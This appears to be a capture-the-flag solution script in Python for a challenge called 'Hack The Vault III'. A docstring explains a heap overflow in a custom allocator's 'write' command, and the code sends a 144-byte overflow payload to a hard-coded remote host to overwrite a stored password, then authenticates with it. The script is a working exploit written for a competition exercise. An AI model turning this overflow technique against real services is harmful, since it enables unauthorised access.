#!/usr/bin/env python3
"""
Hack The Vault III - BushBash2026

Vulnerability (reverse engineered from the `vault` ELF via objdump):

The binary implements its own tiny sbrk-based heap allocator shared between:
  - two "decoy" chunks allocated at startup and immediately freed
    (A: 0x38 bytes total / 0x20 bytes usable, B: 0x58 total / 0x40 usable)
  - the password buffer, chunk C (0x38 total / 0x20 usable), allocated right
    after A and B and loaded from password.txt via fopen/fread. C is never
    freed.
  - user "messages" created by the `write` command.

`write` scans the single shared freelist for ANY chunk with flag != 0
(free), and reuses it for the new message via:
    strncpy(chunk_data, input, strlen(input) + 1)
WITHOUT checking that the chunk's original size can hold the new message.

Since A and B are freed at startup (in that order) and C (the password) is
never freed, the very first `write` call reuses chunk A. Chunks are
contiguous in memory in creation order (A, B, C), so overflowing A's 32-byte
data region overflows straight through B's header+data and into C's header,
landing exactly in the password buffer at offset:

    len(A_data) + len(B_header) + len(B_data) + len(C_header)
    = 32 + 24 + 64 + 24 = 144 bytes

By sending 144 bytes of filler + our own chosen password + an embedded NUL
(to terminate the string exactly there, since strlen()/strncpy() length is
computed from our own input and stops at the first NUL byte), we overwrite
the stored password with a string of our choosing. We then just `auth` with
that chosen password to get the flag.
"""
import socket
import sys

HOST = "34.40.133.67"
PORT = 6002

FILLER_LEN = 144
NEW_PASSWORD = b"pwn3d"


def recv_until(sock, marker, timeout=5):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main():
    s = socket.create_connection((HOST, PORT))
    banner = recv_until(s, b"> ")
    print(banner.decode(errors="replace"))

    # Step 1: write an overflowing message that corrupts the password buffer.
    s.sendall(b"write\n")
    print(recv_until(s, b"message: ").decode(errors="replace"))

    payload = b"A" * FILLER_LEN + NEW_PASSWORD + b"\x00\n"
    s.sendall(payload)
    print(recv_until(s, b"> ").decode(errors="replace"))

    # Step 2: authenticate with our chosen password.
    s.sendall(b"auth\n")
    print(recv_until(s, b"vault.\n").decode(errors="replace"))
    s.sendall(NEW_PASSWORD + b"\n")

    result = recv_until(s, b"}", timeout=8)
    print(result.decode(errors="replace"))

    s.close()


if __name__ == "__main__":
    main()
